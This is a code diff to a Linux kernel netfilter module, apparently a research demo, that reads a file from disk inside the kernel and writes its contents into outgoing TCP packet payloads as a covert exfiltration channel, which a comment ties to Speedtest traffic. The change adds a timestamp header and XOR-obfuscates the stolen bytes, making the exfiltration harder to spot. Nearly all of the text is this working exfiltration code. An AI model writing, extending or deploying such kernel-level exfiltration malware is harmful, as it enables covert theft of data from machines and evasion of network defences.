@@ -25,6 +25,7 @@ Tested on Ubuntu 24.04 with version 6.8 kernel.
 #include <linux/jiffies.h>
 #include <linux/file.h>
 #include <linux/fs.h>
+#include <linux/timekeeping.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Janessa Palmieri");
@@ -48,41 +49,54 @@ static unsigned long total_exfiled_bytes = 0;
 static struct nf_hook_ops *nfho = NULL; 
 
 //function that demonstrates the exfiltration of a test file.
-static unsigned int exfil_file(struct sk_buff *skb, int offset) {
+static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len) {
     //file variables
     struct file *testfile;
-    char buffer[100];
+    char buffer[1400];
     loff_t pos = 0;
     ssize_t bytes_read;
+    int max_data = payload_len - 6; //6 header bytes: 4 timestamp + 2 length
+    int i;
+
+    if (max_data <= 0)
+        return NF_ACCEPT;
 
     //Open the file
-    testfile = filp_open(TEST_FILE, O_RDONLY, 0); //change to the file you want to exfiltrate
+    testfile = filp_open(TEST_FILE, O_RDONLY, 0);
     if (IS_ERR(testfile)) {
-        //pr_err("Failed to open file\n");
         return NF_ACCEPT;
     }
 
-    //Read from the file
-    bytes_read = kernel_read(testfile, buffer, sizeof(buffer), &pos);
+    //Read from the file, capped at payload space and buffer size
+    bytes_read = kernel_read(testfile, buffer, min((size_t)max_data, sizeof(buffer) - 1), &pos);
     if (bytes_read < 0) {
-        //pr_err("Failed to read file\n");
         filp_close(testfile, NULL);
         return NF_ACCEPT;
     }
-
-    //null-terminate the buffer
-    if (bytes_read >= sizeof(buffer)) {
-        bytes_read = sizeof(buffer) -1;
-    }
     buffer[bytes_read] = '\0';
-
-    //pr_info("Read %zd bytes: %s\n", bytes_read, buffer); 
 
     //close file
     filp_close(testfile, NULL);
 
-    //store file in TCP payload
-    skb_store_bits(skb, offset, buffer, bytes_read);
+    //build stamped payload: [4 bytes ts][2 bytes len][xor'd content]
+    time64_t ts = ktime_get_real_seconds();
+    u32 ts32 = (u32)ts;
+    u8 ts_bytes[4] = {
+        ts32 & 0xFF,
+        (ts32 >> 8) & 0xFF,
+        (ts32 >> 16) & 0xFF,
+        (ts32 >> 24) & 0xFF
+    };
+
+    char stamped[1406];
+    memcpy(stamped, ts_bytes, 4);
+    stamped[4] = (bytes_read >> 8) & 0xFF;
+    stamped[5] = bytes_read & 0xFF;
+
+    for (i = 0; i < bytes_read; i++)
+        stamped[6 + i] = buffer[i] ^ ts_bytes[i % 4];
+
+    skb_store_bits(skb, offset, stamped, 6 + bytes_read);
     return NF_ACCEPT;
 
 }
@@ -170,7 +184,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 		tcp_payloadlen = total_len - ip_hdr_len - tcp_hdr_len;
 
         //call function that demos exfil of a test file
-        exfil_file(skb, tcp_payloadoffset);
+        exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);
 
 		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
         //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);
